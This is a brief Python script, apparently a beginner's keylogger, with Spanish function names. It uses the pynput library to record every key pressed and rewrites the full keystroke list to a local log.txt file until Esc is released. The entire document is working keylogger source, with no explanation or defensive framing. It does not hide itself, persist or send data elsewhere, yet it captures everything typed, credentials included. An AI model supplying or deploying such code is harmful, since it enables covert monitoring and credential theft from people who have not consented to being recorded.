from pynput.keyboard import Key, Listener

keys = []

def presionar_tecla(key):
    keys.append(key)
    convertir_string(keys)


def convertir_string(keys):
    with open('log.txt','w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key)


def soltar_tecla(key):
    if key == Key.esc:
        return False


with Listener(on_press = presionar_tecla, on_release = soltar_tecla) as listener:
    listener.join()